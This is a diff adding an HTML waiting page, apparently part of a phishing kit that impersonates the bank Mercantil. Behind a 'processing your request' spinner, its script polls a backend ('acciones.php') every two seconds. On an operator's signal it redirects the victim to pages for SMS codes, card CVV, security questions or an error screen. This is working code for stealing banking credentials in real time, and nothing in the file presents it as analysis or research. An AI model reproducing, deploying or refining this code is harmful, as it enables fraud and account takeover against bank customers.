@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256"/>
+<title>Mercantil</title>
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: url('https://i.postimg.cc/KcW2wffW/12512515.png') center/cover no-repeat fixed;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  .overlay {
+    background-color: rgba(0, 0, 0, 0.6);
+    padding: 40px;
+    border-radius: 10px;
+    text-align: center;
+    color: #fff;
+    backdrop-filter: blur(5px);
+  }
+  .multi-spinner-container {
+    width: 80px;
+    height: 80px;
+    position: relative;
+    margin: 20px auto;
+    overflow: hidden;
+    border-radius: 50%;
+    padding: 1px;
+  }
+  .multi-spinner {
+    position: relative;
+    width: 100%;
+    height: 100%;
+    border: 4px solid transparent;
+    border-radius: 50%;
+    animation: spin 1.5s linear infinite;
+  }
+  .multi-spinner.blue {
+    border-top-color: #004e9b;
+  }
+  .multi-spinner.orange {
+    border-top-color: #ff5800;
+    animation-delay: -0.75s;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  .text {
+    font-size: 18px;
+    margin-top: 10px;
+  }
+  .subtext {
+    font-size: 14px;
+    color: #ddd;
+  }
+</style>
+</head>
+<body>
+  <div class="overlay">
+    <div class="multi-spinner-container">
+      <div class="multi-spinner blue">
+        <div class="multi-spinner orange"></div>
+      </div>
+    </div>
+    <div class="text">Procesando su solicitud...</div>
+    <div class="subtext" id="msg">Consultando tu información...</div>
+  </div>
+
+<script>
+  const BACKEND_URL = 'acciones.php';
+  const mensajes = [
+    "Consultando tu información...",
+    "Verificando tus datos...",
+    "Preparando la siguiente página..."
+  ];
+  let i = 0;
+  setInterval(() => {
+    document.getElementById("msg").textContent = mensajes[i % mensajes.length];
+    i++;
+  }, 2000);
+
+  function obtenerSessionIdLimpio() {
+    const urlParams = new URLSearchParams(window.location.search);
+    let id = urlParams.get('id');
+    if (!id || id === 'undefined' || id === 'null' || id === 'sessionId') id = sessionStorage.getItem('active_session_id');
+    if (!id || id === 'undefined' || id === 'null' || id === 'sessionId') id = Date.now().toString();
+    sessionStorage.setItem('active_session_id', id);
+    return id;
+  }
+  const sessionId = obtenerSessionIdLimpio();
+
+  function comprobarEstado() {
+    if (!sessionId) return;
+    fetch(`${BACKEND_URL}?accion=verificar&id=${encodeURIComponent(sessionId)}&t=${Date.now()}`)
+      .then(res => res.json())
+      .then(data => {
+        const e = data.estado;
+        if (e === 'mostrar_sms')              window.location.href = 'sms.html?id=' + encodeURIComponent(sessionId);
+        else if (e === 'mostrar_sms_error')   window.location.href = 'sms-error.html?id=' + encodeURIComponent(sessionId);
+        else if (e === 'mostrar_cvv')         window.location.href = 'cvv.html?id=' + encodeURIComponent(sessionId);
+        else if (e === 'mostrar_preguntas_usuario') window.location.href = 'preguntase830.html?id=' + encodeURIComponent(sessionId);
+        else if (e === 'aprobado_final' || e === 'aprobado_clave') window.location.href = 'finalizar.html?id=' + encodeURIComponent(sessionId);
+        else if (e === 'falso' || e === 'rechazado') window.location.href = 'index-error.html?id=' + encodeURIComponent(sessionId);
+      })
+      .catch(err => console.log("Reintentando conexión...", err));
+  }
+  setInterval(comprobarEstado, 2000);
+</script>
+</body>
+</html>
